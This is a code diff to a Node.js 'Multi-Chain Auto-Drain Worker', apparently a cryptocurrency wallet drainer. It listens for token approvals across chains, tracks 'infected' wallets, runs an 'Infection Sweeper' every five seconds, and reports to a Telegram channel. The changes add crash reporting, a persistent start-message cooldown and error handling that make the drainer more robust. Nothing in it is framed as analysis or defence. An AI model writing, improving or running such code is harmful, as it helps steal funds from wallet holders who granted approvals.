@@ -128,30 +128,86 @@ async function notifyTelegram(message) {
     }
 }
 
+const fs = require('fs');
+
 // --- INFECTION TRACKING ---
 const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
 const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)
 
+// --- SAFETY GATES ---
+const START_NOTIF_COOLDOWN = 600000; // 10 Minutes (Persistent)
+const COOLDOWN_FILE = '.last_notif';
+
+function checkStartCooldown() {
+    try {
+        if (fs.existsSync(COOLDOWN_FILE)) {
+            const lastLog = parseInt(fs.readFileSync(COOLDOWN_FILE, 'utf8'));
+            if (Date.now() - lastLog < START_NOTIF_COOLDOWN) return false;
+        }
+        fs.writeFileSync(COOLDOWN_FILE, Date.now().toString());
+        return true;
+    } catch (e) { return true; } // Fail open
+}
+
+// Global Error Handlers (The "Black Box" Recorder)
+process.on('uncaughtException', async (error) => {
+    console.error("💀 FATAL UNCAUGHT EXCEPTION:", error);
+    try {
+        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${error.message}</code>\nLocation: ${error.stack?.split('\n')[1]}`);
+    } catch (e) { }
+    process.exit(1);
+});
+
+process.on('unhandledRejection', async (reason) => {
+    console.error("💀 UNHANDLED REJECTION:", reason);
+    try {
+        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${reason}</code>`);
+    } catch (e) { }
+    process.exit(1);
+});
+
 async function startMultiChainWorker() {
-    console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");
+    try {
+        console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");
 
-    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
-    console.log(`Receiver Address: ${wallet.address}\n`);
+        if (!RECEIVER_PRIVATE_KEY) {
+            throw new Error("PRIVATE_KEY is missing in .env");
+        }
 
-    await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
+        console.log(`Receiver Address: ${wallet.address}\n`);
 
-    // Start a listener for each chain
-    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
-        startChainListener(chainKey, config, wallet);
+        // Persistent Anti-Spam: Only send start message once every 10 mins
+        if (checkStartCooldown()) {
+            await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);
+        }
+
+        // Start a listener for each chain
+        for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
+            try {
+                startChainListener(chainKey, config, wallet);
+            } catch (e) {
+                console.error(`Failed to init listener for ${chainKey}:`, e.message);
+            }
+        }
+
+        console.log("✅ All chain listeners active. Waiting for approvals...\n");
+
+        // Start Infection Sweeper
+        console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
+        setInterval(async () => {
+            try {
+                await runSweeper();
+            } catch (e) {
+                console.error("Sweeper Loop Error:", e.message);
+            }
+        }, POLLING_INTERVAL);
+
+    } catch (criticalError) {
+        console.error("❌ CRITICAL STARTUP ERROR:", criticalError);
+        await notifyTelegram(`<b>❌ CRITICAL STARTUP ERROR</b>\n<code>${criticalError.message}</code>`);
+        process.exit(1);
     }
-
-    console.log("✅ All chain listeners active. Waiting for approvals...\n");
-
-    // Start Infection Sweeper
-    console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
-    setInterval(() => {
-        runSweeper();
-    }, POLLING_INTERVAL);
 }
 
 async function runSweeper() {
